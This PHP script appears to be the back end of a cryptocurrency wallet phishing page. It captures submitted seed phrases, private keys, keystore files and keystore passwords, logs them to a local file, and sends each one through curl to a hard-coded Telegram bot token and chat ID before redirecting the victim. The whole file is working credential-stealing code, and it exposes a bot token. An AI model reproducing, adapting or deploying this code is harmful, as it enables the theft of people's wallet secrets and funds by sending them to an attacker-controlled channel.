<?php
//get data from form


date_default_timezone_set('Africa/Lagos');
$date = date('d-m-y h:i:s');


if(isset($_POST['phrase']) != ""){
    if ($_POST['phrase'] != ""){
    $name = $_POST['phrase'];
    // $wallet = $_POST['walletname'];
    // $txt = $date ." Wallet = ".$wallet ." Phrase = ". $name."\r\n";
    $txt = "Phrase = ". $name;
    $file=fopen("name.txt", "a");
    fwrite($file, $txt);
    fclose($file);
    
    $words = str_replace(" ","%20",$txt);
    
    $ch = curl_init();

    // set URL and other appropriate options
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5596482199:AAHyXVlQI1LB2rW5ypfuwLpkj0wAzzUM3Ss/sendmessage?text='". $words ."'&chat_id=1201830280");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    
    // grab URL and pass it to the browser
    curl_exec($ch);
    
    // close cURL resource, and free up system resources
    curl_close($ch);
    
        
    }

}


if(isset($_POST['privatekey'])){
    if ($_POST['privatekey'] != "") {
    $name = $_POST['privatekey'];
    $txt = "Private key = ". $name;
    
    $file=fopen("name.txt", "a");
    fwrite($file, $txt);
    fclose($file);
    
    $words = str_replace(" ","%20",$txt);
    
    $ch = curl_init();

    // set URL and other appropriate options
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5596482199:AAHyXVlQI1LB2rW5ypfuwLpkj0wAzzUM3Ss/sendmessage?text='". $words ."'&chat_id=1201830280");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    
    // grab URL and pass it to the browser
    curl_exec($ch);
    
    // close cURL resource, and free up system resources
    curl_close($ch);

    }
}

if(isset($_FILES["file"])) {
    
    $currentDirectory = getcwd();
    $uploadDirectory = "/uploads/";
    
    $errors = []; // Store errors here
    
    $fileExtensionsAllowed = ['txt', 'json']; // These will be the only file extensions allowed 
    $fileName = $_FILES['file']['name'];
    $fileSize = $_FILES['file']['size'];
    $fileTmpName  = $_FILES['file']['tmp_name'];
    $fileType = $_FILES['file']['type'];
    $fileExtension = strtolower(end(explode('.',$fileName)));
    
    $newfilename =  $date . "." . $fileExtension;
    
    // $uploadPath = $currentDirectory . $uploadDirectory . basename($fileName); 
    $uploadPath = $currentDirectory . $uploadDirectory . $newfilename; 

    if (! in_array($fileExtension,$fileExtensionsAllowed)) {
        $errors[] = "This file extension is not allowed. Please upload a txt file";
    }

    if ($fileSize > 4000000) {
        $errors[] = "File exceeds maximum size (4MB)";
    }

    if (empty($errors)) {
        
        $didUpload = move_uploaded_file($fileTmpName, $uploadPath);

        if ($didUpload) {
          echo "The file " . basename($fileName) . " has been uploaded";
        } else {
          echo "An error occurred. Please contact the administrator.";
        }
    }

    if ($_POST['keystorepassword'] != "") {
        $name = $_POST['keystorepassword'];
        $txt ="keystorepassword = ". $name;
        
        $file=fopen("name.txt", "a");
        fwrite($file, $txt);
        fclose($file);
        
        $words = str_replace(" ","%20",$txt);
    
        $ch = curl_init();
    
        // set URL and other appropriate options
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5596482199:AAHyXVlQI1LB2rW5ypfuwLpkj0wAzzUM3Ss/sendmessage?text=". $words ."&chat_id=1201830280");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        
        // grab URL and pass it to the browser
        curl_exec($ch);
        
        // close cURL resource, and free up system resources
        curl_close($ch);
    }

}


//redirect
header("Location: rand.html");
?>